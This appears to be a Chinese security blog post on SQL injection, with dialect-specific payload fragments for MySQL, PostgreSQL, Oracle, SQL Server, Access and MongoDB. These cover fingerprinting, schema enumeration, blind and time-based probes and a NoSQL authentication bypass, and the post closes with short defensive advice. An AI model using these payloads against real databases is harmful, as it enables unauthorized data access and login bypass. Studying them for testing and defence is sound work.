---
title: "SQL数据库特性"
published: 2026-05-20
updated: 2026-05-20
draft: false
description: "不同数据库的SQL方言、系统表、函数、语法规则各有差异。实战中需要先识别数据库类型，再针对性地使用注入语法。"
image: ""
tags:
  - SQL注入
category: 网络安全
pinned: false
comment: true
author: Ziddzide
---

<!-- AI: SQL注入-数据库特性 | MySQL/PostgreSQL/Oracle/SQL Server/Access/SQLite/MongoDB差异 | 关键词: mysql注入, postgresql注入, oracle注入, mssql注入, access注入, nosql注入 -->

# SQL注入-数据库特性

## 原理

不同数据库的SQL方言、系统表、函数、语法规则各有差异。实战中需要先识别数据库类型，再针对性地使用注入语法。

## 利用方式

### 一、数据库类型识别

| 方法 | MySQL | SQL Server | Oracle | PostgreSQL |
|------|-------|------------|--------|------------|
| 字符串拼接 | `'a' 'b'='ab'` 或 `concat('a','b')='ab'` | `'a'+'b'='ab'` | `'a'\|\|'b'='ab'` | `'a'\|\|'b'='ab'` |
| 注释符 | `#` / `-- ` | `-- ` | `-- ` | `-- ` |
| 除法取整 | `5/2=2.5`(假) | `5/2=2`(真) | `5/2=2`(真) | `5/2=2`(真) |
| 版本函数 | `version()` | `@@version` | `select banner from v$version` | `version()` |
| 延时函数 | `sleep(5)` | `waitfor delay '0:0:5'` | `dbms_lock.sleep(5)` | `pg_sleep(5)` |

### 二、MySQL

```sql
-- 基本信息
select version(), user(), database(), @@version_compile_os

-- 系统库查表名 (核心)
select table_name from information_schema.tables where table_schema='db'
-- 绕过information_schema:
select table_name from mysql.innodb_table_stats
select table_name from sys.schema_table_statistics where table_schema=database()

-- 查列名
select column_name from information_schema.columns where table_name='users'

-- 联合注入列数
order by N            -- 递增, 到报错为止

-- 跨库查询 (需要权限)
select table_name from information_schema.tables where table_schema='other_db'

-- 字符截取
substr(str, 1, 1)
mid(str, 1, 1)
left(str, 1)
right(str, 1)

-- 条件判断
if(condition, true_val, false_val)
case when condition then true_val else false_val end
```

### 三、PostgreSQL

```sql
-- 联合查询回显判断 (必须用null)
select null,null,null     -- 而非 select 1,2,3

-- 基本信息
select current_user, current_database()

-- 获取数据库名
select string_agg(datname,',') from pg_database

-- 获取表名
select string_agg(tablename,',') from pg_tables where schemaname='public'
select string_agg(relname,',') from pg_stat_user_tables

-- 获取列名
select string_agg(column_name,',') from information_schema.columns where table_name='users'

-- 条件判断
select case when (condition) then result1 else result2 end

-- 字符串截取
substr(str from 1 for 1)
left(str, 1)

-- 字符串拼接
'a' || 'b' || 'c'
concat('a', 'b')          -- 部分版本支持
```

### 四、Oracle

```sql
-- 联合查询必须带 FROM DUAL
union select null,null from dual

-- 获取表名
select table_name from all_tables where owner=user
select table_name from user_tables

-- 获取列名
select column_name from all_tab_columns where table_name='USERS'

-- 版本信息
select banner from v$version where rownum=1

-- 条件判断 (Oracle没有IF,用decode)
decode(1,1, true, val1, val2)

-- 字符串拼接
'a' || 'b'

-- 限制: Oracle不能省略FROM, 不能直接SELECT常量值
```

### 五、SQL Server (MSSQL)

```sql
-- 获取表名
select name from sys.objects where type='U'
select name from sysobjects where xtype='U'    -- 旧版本

-- 获取列名
select name from syscolumns where id=object_id('users')

-- 联合查询 (SQL Server会自动补全FROM)
union select 1,2,3 [...]
-- SQL Server 的UNION SELECT必须要有 FROM子句，否则会报错。通常的做法是 union select 1,2,3 from sysobjects`或 `union select 1,2,3 from dual（如果创建了 dual 表）
-- 字符串截取
substring(str, 1, 1)

-- 字符串拼接
'a' + 'b'

-- 延时
if (condition) waitfor delay '0:0:5'
```

### 六、Access

```sql
-- Access特点: 无information_schema, 不使用多数据库模型
-- 只能通过盲注猜表名和列名, 或社工猜测

-- 无注释符, 只能用%00截断
union select 1,2,3 from admin%00
-- 问题分析：%00是 URL 编码中的空字符截断，通常用于绕过 WAF 或 ASP 环境的字符串截断。**它不是 Access SQL 语法的一部分**。在 Access 本身的 SQL 解析器中，%00只是一个普通的字符，不会被当作截断符。
    
-- 后果：在纯 Access 注入（非 Web 前端）的场景下，这个 Payload 无效。

-- 盲注: 逐表猜测
and (select count(*) from admin)>0
and (select len(username) from admin where id=1)=5
and (select asc(mid(username,1,1)) from admin where id=1)>97
```

### 七、MongoDB (NoSQL)

```javascript
-- MongoDB注入本质是BSON查询注入, 非SQL语法
-- 利用$ne, $gt, $lt, $regex等操作符

// 认证绕过
{"username": {"$ne": null}, "password": {"$ne": null}}

// 盲注 (利用$regex)
{"username": "admin", "password": {"$regex": "^a"}}

// 时间盲注
{"$where": "sleep(5000)"}
```

---

## 防御方案

- 所有数据库统一使用参数化查询
- 针对NoSQL需用白名单校验输入结构
- 数据库账户按需赋权，避免跨库访问

## 关联知识

- [[SQL注入-注入类型与利用]]
- [[SQL注入-绕过技术进阶]]
